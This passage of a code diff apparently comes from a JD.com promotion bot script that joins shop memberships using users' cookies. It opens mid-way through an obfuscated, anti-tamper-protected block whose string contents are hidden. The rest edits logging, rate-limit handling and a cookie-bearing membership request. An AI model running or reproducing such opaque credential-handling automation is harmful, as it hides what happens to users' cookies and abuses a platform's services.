_0xef5fx4[__Oxe963f[0x11]][__Oxe963f[0x1c]]!= __Oxe963f[0xa]){$[__Oxe963f[0x1d]]= _0xef5fx4[__Oxe963f[0x11]][__Oxe963f[0x1c]]};if(_0xef5fx4[__Oxe963f[0x11]]&&  typeof _0xef5fx4[__Oxe963f[0x11]][__Oxe963f[0x1e]]!= __Oxe963f[0xa]){$[__Oxe963f[0x1e]]= _0xef5fx4[__Oxe963f[0x11]][__Oxe963f[0x1e]]}}else {if(_0xef5fx4[__Oxe963f[0x14]]){console[__Oxe963f[0x5]](`${__Oxe963f[0x0]}${_0xef5fx2}${__Oxe963f[0x15]}${_0xef5fx4[__Oxe963f[0x14]]|| __Oxe963f[0x0]}${__Oxe963f[0x0]}`)}else {console[__Oxe963f[0x5]](`${__Oxe963f[0x0]}${_0xef5fx2}${__Oxe963f[0x15]}${_0xef5fx3}${__Oxe963f[0x0]}`)}}}else {console[__Oxe963f[0x5]](`${__Oxe963f[0x0]}${_0xef5fx2}${__Oxe963f[0x15]}${_0xef5fx3}${__Oxe963f[0x0]}`)};break;case __Oxe963f[0x23]:if( typeof _0xef5fx4== __Oxe963f[0x7]){if(_0xef5fx4[__Oxe963f[0xf]]&& _0xef5fx4[__Oxe963f[0xf]]=== true){if(_0xef5fx4[__Oxe963f[0x11]]&&  typeof _0xef5fx4[__Oxe963f[0x11]][__Oxe963f[0x20]]!= __Oxe963f[0xa]){$[__Oxe963f[0x21]]= _0xef5fx4[__Oxe963f[0x11]][__Oxe963f[0x20]]|| __Oxe963f[0x22]}}else {if(_0xef5fx4[__Oxe963f[0x14]]){console[__Oxe963f[0x5]](`${__Oxe963f[0x0]}${_0xef5fx2}${__Oxe963f[0x15]}${_0xef5fx4[__Oxe963f[0x14]]|| __Oxe963f[0x0]}${__Oxe963f[0x0]}`)}else {console[__Oxe963f[0x5]](`${__Oxe963f[0x0]}${_0xef5fx2}${__Oxe963f[0x15]}${_0xef5fx3}${__Oxe963f[0x0]}`)}}}else {console[__Oxe963f[0x5]](`${__Oxe963f[0x0]}${_0xef5fx2}${__Oxe963f[0x15]}${_0xef5fx3}${__Oxe963f[0x0]}`)};break;case __Oxe963f[0x34]:if( typeof _0xef5fx4== __Oxe963f[0x7]){if(_0xef5fx4[__Oxe963f[0xf]]&& _0xef5fx4[__Oxe963f[0xf]]=== true){$[__Oxe963f[0x24]]= _0xef5fx4[__Oxe963f[0x11]][__Oxe963f[0x24]]|| __Oxe963f[0x0];$[__Oxe963f[0x25]]= _0xef5fx4[__Oxe963f[0x11]][__Oxe963f[0x25]]|| false;$[__Oxe963f[0x26]]= _0xef5fx4[__Oxe963f[0x11]][__Oxe963f[0x26]]|| 0;$[__Oxe963f[0x27]]= _0xef5fx4[__Oxe963f[0x11]][__Oxe963f[0x27]];if($[__Oxe963f[0x28]]== 1){$[__Oxe963f[0x29]]= __Oxe963f[0x2a];console[__Oxe963f[0x5]](`${__Oxe963f[0x2b]}`);for(let _0xef5fx5 of $[__Oxe963f[0x27]]){if(_0xef5fx5[__Oxe963f[0x2e]][__Oxe963f[0x2d]](__Oxe963f[0x2c])==  -1){$[__Oxe963f[0x29]]+= `${__Oxe963f[0x0]}${_0xef5fx5[__Oxe963f[0x2e]]}${__Oxe963f[0x2f]}`;console[__Oxe963f[0x5]](`${__Oxe963f[0x30]}${_0xef5fx5[__Oxe963f[0x2e]]}${__Oxe963f[0x2f]}`)}}};$[__Oxe963f[0x31]]= _0xef5fx4[__Oxe963f[0x11]][__Oxe963f[0x31]]|| 0;$[__Oxe963f[0x32]]= _0xef5fx4[__Oxe963f[0x11]][__Oxe963f[0x32]]|| 0;$[__Oxe963f[0x33]]= _0xef5fx4[__Oxe963f[0x11]][__Oxe963f[0x33]]|| 0}else {if(_0xef5fx4[__Oxe963f[0x14]]){console[__Oxe963f[0x5]](`${__Oxe963f[0x0]}${_0xef5fx2}${__Oxe963f[0x15]}${_0xef5fx4[__Oxe963f[0x14]]|| __Oxe963f[0x0]}${__Oxe963f[0x0]}`)}else {console[__Oxe963f[0x5]](`${__Oxe963f[0x0]}${_0xef5fx2}${__Oxe963f[0x15]}${_0xef5fx3}${__Oxe963f[0x0]}`)}}}else {console[__Oxe963f[0x5]](`${__Oxe963f[0x0]}${_0xef5fx2}${__Oxe963f[0x15]}${_0xef5fx3}${__Oxe963f[0x0]}`)};break;case __Oxe963f[0x37]:if( typeof _0xef5fx4== __Oxe963f[0x7]){if(_0xef5fx4[__Oxe963f[0xf]]&& _0xef5fx4[__Oxe963f[0xf]]=== true){$[__Oxe963f[0x35]]= _0xef5fx4[__Oxe963f[0x11]][__Oxe963f[0x35]]|| 0;$[__Oxe963f[0x36]]= _0xef5fx4[__Oxe963f[0x11]][__Oxe963f[0x36]]|| false;$[__Oxe963f[0x26]]= _0xef5fx4[__Oxe963f[0x11]][__Oxe963f[0x26]]|| 0;$[__Oxe963f[0x27]]= _0xef5fx4[__Oxe963f[0x11]][__Oxe963f[0x27]]|| [];if($[__Oxe963f[0x28]]== 1){$[__Oxe963f[0x29]]= __Oxe963f[0x2a];console[__Oxe963f[0x5]](`${__Oxe963f[0x2b]}`);for(let _0xef5fx5 of $[__Oxe963f[0x27]]){if(_0xef5fx5[__Oxe963f[0x2e]][__Oxe963f[0x2d]](__Oxe963f[0x2c])==  -1){$[__Oxe963f[0x29]]+= `${__Oxe963f[0x0]}${_0xef5fx5[__Oxe963f[0x2e]]}${__Oxe963f[0x2f]}`;console[__Oxe963f[0x5]](`${__Oxe963f[0x30]}${_0xef5fx5[__Oxe963f[0x2e]]}${__Oxe963f[0x2f]}`)}}};$[__Oxe963f[0x31]]= _0xef5fx4[__Oxe963f[0x11]][__Oxe963f[0x31]]|| 0;$[__Oxe963f[0x32]]= _0xef5fx4[__Oxe963f[0x11]][__Oxe963f[0x32]]|| 0;$[__Oxe963f[0x33]]= _0xef5fx4[__Oxe963f[0x11]][__Oxe963f[0x33]]|| 0}else {if(_0xef5fx4[__Oxe963f[0x14]]){console[__Oxe963f[0x5]](`${__Oxe963f[0x0]}${_0xef5fx2}${__Oxe963f[0x15]}${_0xef5fx4[__Oxe963f[0x14]]|| __Oxe963f[0x0]}${__Oxe963f[0x0]}`)}else {console[__Oxe963f[0x5]](`${__Oxe963f[0x0]}${_0xef5fx2}${__Oxe963f[0x15]}${_0xef5fx3}${__Oxe963f[0x0]}`)}}}else {console[__Oxe963f[0x5]](`${__Oxe963f[0x0]}${_0xef5fx2}${__Oxe963f[0x15]}${_0xef5fx3}${__Oxe963f[0x0]}`)};break;case __Oxe963f[0x3b]:if( typeof _0xef5fx4== __Oxe963f[0x7]){if(_0xef5fx4[__Oxe963f[0xf]]&& _0xef5fx4[__Oxe963f[0xf]]=== true){$[__Oxe963f[0x38]]= _0xef5fx4[__Oxe963f[0x11]][__Oxe963f[0x38]];if($[__Oxe963f[0x28]]== 1){console[__Oxe963f[0x5]](`${__Oxe963f[0x39]}${$[__Oxe963f[0x38]]}${__Oxe963f[0x3a]}`)}}};break;case __Oxe963f[0x3c]:;case __Oxe963f[0x49]:if( typeof _0xef5fx4== __Oxe963f[0x7]){if(_0xef5fx4[__Oxe963f[0xf]]&& _0xef5fx4[__Oxe963f[0xf]]=== true){if(_0xef5fx4[__Oxe963f[0x11]][__Oxe963f[0x3d]]){if($[__Oxe963f[0x3e]]){console[__Oxe963f[0x5]](`${__Oxe963f[0x3f]}${_0xef5fx4[__Oxe963f[0x11]][__Oxe963f[0x2e]]}${__Oxe963f[0x0]}`);$[__Oxe963f[0xc]]+= _0xef5fx4[__Oxe963f[0x11]][__Oxe963f[0x2e]]}else {if(_0xef5fx4[__Oxe963f[0x11]][__Oxe963f[0x2e]][__Oxe963f[0x2d]](__Oxe963f[0x40])!=  -1|| _0xef5fx4[__Oxe963f[0x11]][__Oxe963f[0x2e]][__Oxe963f[0x2d]](__Oxe963f[0x41])!=  -1|| _0xef5fx4[__Oxe963f[0x11]][__Oxe963f[0x2e]][__Oxe963f[0x2d]](__Oxe963f[0x42])!=  -1){console[__Oxe963f[0x5]](`${__Oxe963f[0x3f]}${_0xef5fx4[__Oxe963f[0x11]][__Oxe963f[0x2e]]}${__Oxe963f[0x0]}`);$[__Oxe963f[0xc]]+= _0xef5fx4[__Oxe963f[0x11]][__Oxe963f[0x2e]]}else {console[__Oxe963f[0x5]](`${__Oxe963f[0x43]}`);$[__Oxe963f[0xc]]+= `${__Oxe963f[0x44]}`}}}else {console[__Oxe963f[0x5]](`${__Oxe963f[0x43]}`);$[__Oxe963f[0xc]]+= `${__Oxe963f[0x44]}`};console[__Oxe963f[0x5]](`${__Oxe963f[0x45]}`+ _0xef5fx4[__Oxe963f[0x11]][__Oxe963f[0x26]]+ `${__Oxe963f[0x46]}`);$[__Oxe963f[0x26]]= _0xef5fx4[__Oxe963f[0x11]][__Oxe963f[0x26]]}else {if(_0xef5fx4[__Oxe963f[0x14]]){console[__Oxe963f[0x5]](`${__Oxe963f[0x47]}${_0xef5fx4[__Oxe963f[0x14]]}${__Oxe963f[0x0]}`);$[__Oxe963f[0xc]]+= `${__Oxe963f[0x0]}${_0xef5fx4[__Oxe963f[0x14]]}${__Oxe963f[0x15]}`}}}else {console[__Oxe963f[0x5]](`${__Oxe963f[0x48]}`)};break;case __Oxe963f[0x4d]:if( typeof _0xef5fx4== __Oxe963f[0x7]){if(_0xef5fx4[__Oxe963f[0xf]]&& _0xef5fx4[__Oxe963f[0xf]]=== true){$[__Oxe963f[0x4a]]= _0xef5fx4[__Oxe963f[0x11]][__Oxe963f[0x4a]];$[__Oxe963f[0x4b]]= _0xef5fx4[__Oxe963f[0x11]][__Oxe963f[0x4c]]}else {if(_0xef5fx4[__Oxe963f[0x14]]){console[__Oxe963f[0x5]](`${__Oxe963f[0x0]}${_0xef5fx2}${__Oxe963f[0x15]}${_0xef5fx4[__Oxe963f[0x14]]|| __Oxe963f[0x0]}${__Oxe963f[0x0]}`)}else {console[__Oxe963f[0x5]](`${__Oxe963f[0x0]}${_0xef5fx2}${__Oxe963f[0x15]}${_0xef5fx3}${__Oxe963f[0x0]}`)}}}else {console[__Oxe963f[0x5]](`${__Oxe963f[0x0]}${_0xef5fx2}${__Oxe963f[0x15]}${_0xef5fx3}${__Oxe963f[0x0]}`)};break;case __Oxe963f[0x4f]:if( typeof _0xef5fx4== __Oxe963f[0x7]){if(_0xef5fx4[__Oxe963f[0xf]]&& _0xef5fx4[__Oxe963f[0xf]]=== true){console[__Oxe963f[0x5]](`${__Oxe963f[0x4e]}`)}};break;case __Oxe963f[0x51]:if( typeof _0xef5fx4== __Oxe963f[0x7]){$[__Oxe963f[0x50]]= [];if(_0xef5fx4[__Oxe963f[0xf]]&& _0xef5fx4[__Oxe963f[0xf]]=== true){$[__Oxe963f[0x50]]= _0xef5fx4[__Oxe963f[0x11]]}};break;case __Oxe963f[0x57]:if( typeof _0xef5fx4== __Oxe963f[0x7]){if(_0xef5fx4[__Oxe963f[0xf]]&& _0xef5fx4[__Oxe963f[0x11]][__Oxe963f[0x3d]]){console[__Oxe963f[0x5]](`${__Oxe963f[0x52]}${_0xef5fx4[__Oxe963f[0x11]][__Oxe963f[0x2e]]}${__Oxe963f[0x0]}`);$[__Oxe963f[0xc]]+= `${__Oxe963f[0x53]}${$[__Oxe963f[0x54]]}${__Oxe963f[0x55]}${_0xef5fx4[__Oxe963f[0x11]][__Oxe963f[0x2e]]}${__Oxe963f[0x2f]}`}else {console[__Oxe963f[0x5]](`${__Oxe963f[0x0]}${_0xef5fx4[__Oxe963f[0x14]]}${__Oxe963f[0x0]}`);$[__Oxe963f[0xc]]+= `${__Oxe963f[0x53]}${$[__Oxe963f[0x54]]}${__Oxe963f[0x56]}${_0xef5fx4[__Oxe963f[0x14]]}${__Oxe963f[0x2f]}`}};break;case __Oxe963f[0x58]:;case __Oxe963f[0x5c]:if( typeof _0xef5fx4== __Oxe963f[0x7]){if($[__Oxe963f[0x3e]]){if(_0xef5fx4[__Oxe963f[0xf]]&& _0xef5fx4[__Oxe963f[0xf]]=== true){console[__Oxe963f[0x5]](`${__Oxe963f[0x59]}${$[__Oxe963f[0x5a]]}${__Oxe963f[0x0]}`);$[__Oxe963f[0xc]]+= `${__Oxe963f[0x5b]}${$[__Oxe963f[0x5a]]}${__Oxe963f[0x2f]}`}}};break;case __Oxe963f[0x1]:;case __Oxe963f[0x2]:break;default:};if( typeof _0xef5fx4== __Oxe963f[0x7]){if(_0xef5fx4[__Oxe963f[0x14]]){if(_0xef5fx4[__Oxe963f[0x14]][__Oxe963f[0x2d]](__Oxe963f[0x5d])>  -1){$[__Oxe963f[0x5e]]= true}}}}catch(e){console[__Oxe963f[0x5]](e)}}(function(_0xef5fx6,_0xef5fx7,_0xef5fx8,_0xef5fx9,_0xef5fxa,_0xef5fxb){_0xef5fxb= __Oxe963f[0xa];_0xef5fx9= function(_0xef5fxc){if( typeof alert!== _0xef5fxb){alert(_0xef5fxc)};if( typeof console!== _0xef5fxb){console[__Oxe963f[0x5]](_0xef5fxc)}};_0xef5fx8= function(_0xef5fxd,_0xef5fx6){return _0xef5fxd+ _0xef5fx6};_0xef5fxa= _0xef5fx8(__Oxe963f[0x5f],_0xef5fx8(_0xef5fx8(__Oxe963f[0x60],__Oxe963f[0x61]),__Oxe963f[0x62]));try{_0xef5fx6= __encode;if(!( typeof _0xef5fx6!== _0xef5fxb&& _0xef5fx6=== _0xef5fx8(__Oxe963f[0x63],__Oxe963f[0x64]))){_0xef5fx9(_0xef5fxa)}}catch(e){_0xef5fx9(_0xef5fxa)}})({})
 
 function getCK() {
     return new Promise(resolve => {
@@ -872,19 +492,20 @@ function getCK() {
                 if (err) {
                     if (resp && typeof resp.statusCode != 'undefined') {
                         if (resp.statusCode == 493) {
-                            console.log('此ip已被限制，请过10分钟后再执行脚本\n')
-                            $.outFlag = true
+                            console.log('😭此ip已被限制，请过10分钟后再执行脚本\n')
+                            $.stop = true
                         }
                     }
-                    console.log(`${$.toStr(err)}`)
+                    // console.log(`${$.toStr(err)}`)
                     console.log(`${$.name} cookie API请求失败，请检查网路重试`)
                 } else {
                     // console.log(JSON.stringify(resp.headers))
-                    // let end = data.match(/(活动已经结束)/) && data.match(/(活动已经结束)/)[1] || ''
-                    // if (end) {
-                    //     $.activityEnd = true
-                    //     console.log('活动已结束')
-                    // }
+                    let end = data.match(/(活动已经结束)/) && data.match(/(活动已经结束)/)[1] || ''
+                    if (end) {
+                        $.activityEnd = true
+                        console.log('😭活动已结束')
+                        $.stop = true
+                    }
                     setActivityCookie(resp)
                 }
             } catch (e) {
@@ -961,56 +582,6 @@ function getQueryString(url, name) {
     return '';
 }
 
-// async function joinShop() {
-//     if (!$.joinVenderId) return
-//     return new Promise(async resolve => {
-//         $.errorJoinShop = '活动太火爆，请稍后再试'
-//         let activityId = ``
-//         if ($.shopactivityId) activityId = `,"activityId":${$.shopactivityId}`
-//         let body = `{"venderId":"${$.venderId}","shopId":"${$.shopId}","bindByVerifyCodeFlag":1,"registerExtend":{},"writeChildFlag":0${activityId},"channel":406}`
-//         let h5st = '20220412164634306%3Bf5299392a200d6d9ffced997e5790dcc%3B169f1%3Btk02wc0f91c8a18nvWVMGrQO1iFlpQre2Sh2mGtNro1l0UpZqGLRbHiyqfaUQaPy64WT7uz7E%2FgujGAB50kyO7hwByWK%3B77c8a05e6a66faeed00e4e280ad8c40fab60723b5b561230380eb407e19354f7%3B3.0%3B1649753194306'
-//         const options = {
-//             url: `https://api.m.jd.com/client.action?appid=jd_shop_member&functionId=bindWithVender&body=${body}&clientVersion=9.2.0&client=H5&uuid=88888&h5st=${h5st}`,
-//             headers: {
-//                 'accept': '*/*',
-//                 'accept-encoding': 'gzip, deflate, br',
-//                 'accept-language': 'zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7',
-//                 'cookie': cookie,
-//                 'origin': 'https://shopmember.m.jd.com/',
-//                 'user-agent': "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36",
-//             }
-//         }
-//         $.get(options, async (err, resp, data) => {
-//             try {
-//                 data = data && data.match(/jsonp_.*?\((.*?)\);/) && data.match(/jsonp_.*?\((.*?)\);/)[1] || data
-//                 // console.log(data)
-//                 let res = $.toObj(data, data);
-//                 if (res && typeof res == 'object') {
-//                     if (res && res.success === true) {
-//                         console.log(res.message)
-//                         $.errorJoinShop = res.message
-//                         if (res.result && res.result.giftInfo) {
-//                             for (let i of res.result.giftInfo.giftList) {
-//                                 console.log(`入会获得:${i.discountString}${i.prizeName}${i.secondLineDesc}`)
-//                             }
-//                         }
-//                     } else if (res && typeof res == 'object' && res.message) {
-//                         $.errorJoinShop = res.message
-//                         console.log(`${res.message || ''}`)
-//                     } else {
-//                         console.log(data)
-//                     }
-//                 } else {
-//                     console.log(data)
-//                 }
-//             } catch (e) {
-//                 $.logErr(e, resp)
-//             } finally {
-//                 resolve();
-//             }
-//         })
-//     })
-// }
 
 function jsonParse(str) {
     if (typeof str == "string") {
@@ -1053,26 +624,26 @@ async function opencard() {
         $.errorJoinShop = '';
         await joinShop()
         if ($.errorJoinShop.indexOf('活动太火爆，请稍后再试') > -1) {
-            console.log('第1次 重新开卡')
+            console.log('⚠️第1次 重新开卡')
             await $.wait(500)
             await joinShop()
             $.joinErrorTimes++
         }
         if ($.errorJoinShop.indexOf('活动太火爆，请稍后再试') > -1) {
-            console.log('第2次 重新开卡')
+            console.log('⚠️第2次 重新开卡')
             await $.wait(500)
             await joinShop()
             $.joinErrorTimes++
         }
         if ($.errorJoinShop.indexOf('活动太火爆，请稍后再试') > -1) {
-            console.log('第3次 重新开卡')
+            console.log('⚠️第3次 重新开卡')
             await $.wait(500)
             await joinShop()
             $.joinErrorTimes++
         }
         if ($.errorJoinShop.indexOf('活动太火爆，请稍后再试') > -1) {
-            console.log("开卡失败❌ ，重新执行脚本")
-            $.message += `【账号${$.index}】${$.UserName}开卡失败❌ ，请重新执行脚本\n`
+            console.log("开卡失败❌")
+            $.message += `【账号${$.index}】${$.UserName}开卡失败❌\n`
             $.joinErrorTimes++
         }
 
@@ -1094,7 +665,7 @@ function joinShop() {
         if ($.shopactivityId) activityId = `,"activityId":${$.shopactivityId}`;
 
         if ($.openCardStatus) {
-            console.log(`已经是会员了~`);
+            console.log(`☝已经是会员了~`);
             resolve();
         } else {
             let body = `{"venderId":"${$.venderId}","shopId":"${$.shopId}","bindByVerifyCodeFlag":1,"registerExtend":{},"writeChildFlag":0${activityId},"channel":401}`
